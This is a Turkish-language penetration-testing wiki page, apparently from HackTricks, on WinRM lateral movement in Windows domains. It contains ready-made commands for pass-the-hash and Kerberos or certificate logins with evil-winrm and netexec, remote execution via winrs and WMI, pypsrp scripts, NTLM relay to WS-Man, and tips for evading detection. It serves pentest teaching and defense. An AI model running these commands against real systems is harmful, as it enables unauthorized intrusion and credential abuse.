# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM, Windows ortamlarında en kullanışlı **lateral movement** taşıma mekanizmalarından biridir; çünkü SMB service creation trick'lerine ihtiyaç duymadan **WS-Man/HTTP(S)** üzerinden remote shell sağlar. Hedef **5985/5986** portlarını açığa çıkarıyorsa ve principal'ınız remoting kullanma yetkisine sahipse, çoğu zaman "valid creds" aşamasından "interactive shell" aşamasına çok hızlı geçebilirsiniz.

**Protocol/service enumeration**, listener'lar, WinRM'i etkinleştirme, `Invoke-Command` ve genel client kullanımı için şuraya bakın:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Operatörlerin WinRM'i tercih etme nedenleri

- SMB/RPC yerine **HTTP/HTTPS** kullanır; bu nedenle PsExec tarzı execution'ın engellendiği durumlarda çoğu zaman çalışır.
- **Kerberos** ile reusable credentials'ları hedefe göndermekten kaçınır.
- **Windows**, **Linux** ve Python tooling'i (`winrs`, `evil-winrm`, `pypsrp`, `netexec`) üzerinden sorunsuz çalışır.
- Interactive PowerShell remoting yolu, hedefte authenticated user context altında **`wsmprovhost.exe`** başlatır; bu, service-based exec'ten operasyonel olarak farklıdır.

## Access modeli ve ön koşullar

Pratikte başarılı WinRM lateral movement üç şeye bağlıdır:

1. Hedefte bir **WinRM listener** (`5985`/`5986`) bulunması ve firewall kurallarının erişime izin vermesi.
2. Hesabın endpoint'e **authenticate** olabilmesi.
3. Hesabın **remoting session** açma yetkisine sahip olması.

Bu erişimi elde etmenin yaygın yolları:

- Hedefte **Local Administrator** olmak.
- Yeni sistemlerde **Remote Management Users** veya bu grubu hâlâ dikkate alan sistemlerde/bileşenlerde **WinRMRemoteWMIUsers__** üyesi olmak.
- Local security descriptor'lar / PowerShell remoting ACL değişiklikleri aracılığıyla açıkça delege edilmiş remoting haklarına sahip olmak.

Admin haklarına sahip bir box'ı zaten kontrol ediyorsanız, burada açıklanan teknikleri kullanarak full admin group üyeliği olmadan da **WinRM erişimi delegate** edebileceğinizi unutmayın:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Lateral movement sırasında önemli authentication sorunları

- **Kerberos bir hostname/FQDN gerektirir**. IP üzerinden bağlanırsanız client genellikle **NTLM/Negotiate**'e fallback yapar.
- **Workgroup** veya cross-trust edge case'lerinde NTLM genellikle **HTTPS** kullanılmasını veya hedefin client üzerindeki **TrustedHosts** listesine eklenmesini gerektirir.
- Workgroup'ta Negotiate üzerinden **local accounts** kullanıldığında UAC remote restrictions erişimi engelleyebilir; built-in Administrator hesabı kullanılmalı veya `LocalAccountTokenFilterPolicy=1` ayarlanmalıdır.
- PowerShell remoting varsayılan olarak **`HTTP/<host>` SPN**'ini kullanır. **`HTTP/<host>`** başka bir service account'a zaten kayıtlıysa WinRM Kerberos `0x80090322` hatasıyla başarısız olabilir; port-qualified SPN kullanın veya bu SPN'in bulunduğu durumlarda **`WSMAN/<host>`**'e geçin.<sup>[[3]](#references)</sup>

Password spraying sırasında valid credentials elde ederseniz, bunları WinRM üzerinden validate etmek, shell'e dönüşüp dönüşmediklerini kontrol etmenin genellikle en hızlı yoludur:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### Validation ve one-shot execution için NetExec / CrackMapExec
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Etkileşimli shell'ler için Evil-WinRM

`evil-winrm`, **passwords**, **NT hashes**, **Kerberos tickets**, **client certificates**, dosya aktarımı ve bellekte PowerShell/.NET yüklemeyi desteklediği için Linux üzerinden en kullanışlı etkileşimli seçenek olmaya devam ediyor.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Kerberos SPN özel durumu: `HTTP` ve `WSMAN`

Varsayılan **`HTTP/<host>`** SPN'i Kerberos hatalarına neden olduğunda bunun yerine **`WSMAN/<host>`** ticket'ı istemeyi/kullanmayı deneyin. Bu durum, **`HTTP/<host>`** değerinin zaten başka bir service account'a bağlı olduğu hardened veya alışılmadık enterprise kurulumlarında görülür.<sup>[[3]](#references)</sup>
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
Bu, özellikle generic bir `HTTP` ticket yerine bir **WSMAN** service ticket forge ettiğiniz veya talep ettiğiniz **RBCD / S4U** abuse sonrasında da kullanışlıdır.

### Certificate-based authentication

WinRM ayrıca **client certificate authentication** destekler, ancak certificate hedef üzerinde bir **local account** ile eşlenmiş olmalıdır. Offensive açıdan bu, şu durumlarda önem taşır:

- WinRM için zaten eşlenmiş geçerli bir client certificate ve private key çaldıysanız/export ettiyseniz;
- bir principal için certificate elde etmek ve ardından başka bir authentication path'e pivot etmek amacıyla **AD CS / Pass-the-Certificate** abuse gerçekleştirdiyseniz;
- password-based remoting kullanımından bilinçli olarak kaçınan ortamlarda çalışıyorsanız.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM, password/hash/Kerberos auth yöntemlerine kıyasla çok daha az yaygındır; ancak mevcut olduğunda, password rotation sonrasında da çalışmaya devam eden **passwordless lateral movement** yolu sağlayabilir.

### `pypsrp` ile Python / automation

Operator shell yerine automation gerekiyorsa, `pypsrp` Python üzerinden **NTLM**, **certificate auth**, **Kerberos** ve **CredSSP** desteğiyle WinRM/PSRP kullanmanızı sağlar.<sup>[[2]](#references)</sup>
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
Yüksek seviyeli `Client` wrapper'ından daha ayrıntılı kontrol gerektiğinde, daha düşük seviyeli `WSMan` + `RunspacePool` API'leri iki yaygın operator problemi için kullanışlıdır:

- birçok PowerShell client'ının kullandığı varsayılan `HTTP` beklentisi yerine Kerberos service/SPN olarak **`WSMAN`** kullanılmasını zorlamak;
- `Microsoft.PowerShell` yerine **JEA** / custom session configuration gibi **varsayılan olmayan bir PSRP endpoint**'ine bağlanmak.
```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
"srv01.domain.local",
auth="kerberos",
ssl=False,
negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
ps.add_script("whoami; Get-Command")
output = ps.invoke()
print(output)
```
### Lateral movement sırasında Custom PSRP endpoint'leri ve JEA önemlidir

Başarılı bir WinRM authentication işlemi, her zaman varsayılan ve kısıtlanmamış `Microsoft.PowerShell` endpoint'ine eriştiğiniz anlamına gelmez. Olgun ortamlarda, kendi ACL'lerine ve run-as davranışlarına sahip **custom session configurations** veya **JEA** endpoint'leri sunulabilir.<sup>[[1]](#references)</sup>

Bir Windows host üzerinde zaten code execution elde ettiyseniz ve hangi remoting yüzeylerinin mevcut olduğunu anlamak istiyorsanız, kayıtlı endpoint'leri enumerate edin:
```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```
Kullanışlı bir endpoint mevcut olduğunda, varsayılan shell yerine onu açıkça hedefleyin:
```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```
Pratik offensive implications:

- **Kısıtlı** bir endpoint, service control, file access, process creation veya arbitrary .NET / external command execution için doğru cmdlet/function'ları açığa çıkarıyorsa lateral movement için yine de yeterli olabilir.
- Yanlış yapılandırılmış bir JEA role, `Start-Process`, geniş wildcard'lar, writable provider'lar veya amaçlanan kısıtlamalardan escape etmenizi sağlayan custom proxy function'lar gibi tehlikeli command'leri açığa çıkardığında özellikle değerlidir.
- **RunAs virtual account** veya **gMSA** tarafından desteklenen endpoint'ler, çalıştırdığınız command'lerin effective security context'ini değiştirir. Özellikle gMSA destekli bir endpoint, normal bir WinRM session'ı klasik delegation problemine takılsa bile **second hop** üzerinde network identity sağlayabilir.

## Windows-native WinRM lateral movement

### `winrs.exe`

`winrs.exe`, interactive bir PowerShell remoting session'ı açmadan **native WinRM command execution** istediğinizde kullanışlı olan, sistemle birlikte gelen bir araçtır:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
Pratikte unutulması kolay ve önemli iki flag:

- `/noprofile`, remote principal **yerel bir administrator** olmadığında genellikle gereklidir.
- `/allowdelegate`, remote shell'in kimlik bilgilerinizi **üçüncü bir host** üzerinde kullanmasını sağlar (örneğin komutun `\\fileserver\share` gerektirdiği durumlarda).
```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```
Operasyonel olarak, `winrs.exe` genellikle aşağıdakine benzer bir uzak işlem zinciriyle sonuçlanır:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
Bunu hatırlamak önemlidir; çünkü service-based exec ve interactive PSRP sessions yöntemlerinden farklıdır.

### `winrm.cmd` / PowerShell remoting yerine WS-Man COM

`Enter-PSSession` kullanmadan, WS-Man üzerinden WMI sınıflarını çağırarak **WinRM transport** aracılığıyla da çalıştırabilirsiniz. Bu durumda transport WinRM olarak kalırken, remote execution primitive **WMI `Win32_Process.Create`** olur:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
Bu yaklaşım şu durumlarda kullanışlıdır:

- PowerShell logging yakından izleniyorsa.
- Klasik bir PS remoting workflow'u olmadan **WinRM transport** kullanmak istiyorsanız.
- **`WSMan.Automation`** COM object etrafında custom tooling geliştiriyor veya kullanıyorsanız.

## NTLM relay to WinRM (WS-Man)

SMB relay signing nedeniyle engellendiğinde ve LDAP relay kısıtlandığında, **WS-Man/WinRM** hâlâ ilgi çekici bir relay target olabilir. Modern `ntlmrelayx.py`, **WinRM relay servers** içerir ve **`wsman://`** veya **`winrms://`** target'larına relay yapabilir.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
İki pratik not:

- Relay, hedef **NTLM** kabul ettiğinde ve relayed principal'ın WinRM kullanma izni olduğunda en kullanışlıdır.
- Güncel Impacket kodu, `Test-WSMan` tarzı probe'ların Relay akışını bozmaması için **`WSMANIDENTIFY: unauthenticated`** isteklerini özel olarak işler.

İlk WinRM session'ını aldıktan sonraki multi-hop kısıtlamaları için şuraya bakın:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC ve detection notları

- **Interactive PowerShell remoting**, hedefte genellikle **`wsmprovhost.exe`** oluşturur.
- **`winrs.exe`**, yaygın olarak **`winrshost.exe`** ve ardından istenen child process'i oluşturur.
- Özel **JEA** endpoint'leri eylemleri **`WinRM_VA_*`** virtual account'ları veya yapılandırılmış bir **gMSA** olarak çalıştırabilir; bu durum normal user-context shell'e kıyasla hem telemetry'yi hem de second-hop davranışını değiştirir.<sup>[[1]](#references)</sup>
- **Network logon** telemetry'si, WinRM service event'leri ve PSRP kullanıyorsanız (raw `cmd.exe` yerine) PowerShell operational/script-block logging bekleyin.
- Yalnızca tek bir command'a ihtiyacınız varsa, `winrs.exe` veya one-shot WinRM execution, uzun süreli bir interactive remoting session'ından daha az gürültülü olabilir.
- Kerberos kullanılabiliyorsa, hem trust sorunlarını hem de client-side `TrustedHosts` değişikliklerini azaltmak için IP + NTLM yerine **FQDN + Kerberos** tercih edin.

## References

- [1] [Microsoft: JEA Security Considerations](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [2] [pypsrp README](https://github.com/jborean93/pypsrp)
- [3] [Microsoft: WinRM üzerinden uzak bir sunucuya PowerShell ile bağlanırken `0x80090322` hatası](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)


{{#include ../../banners/hacktricks-training.md}}
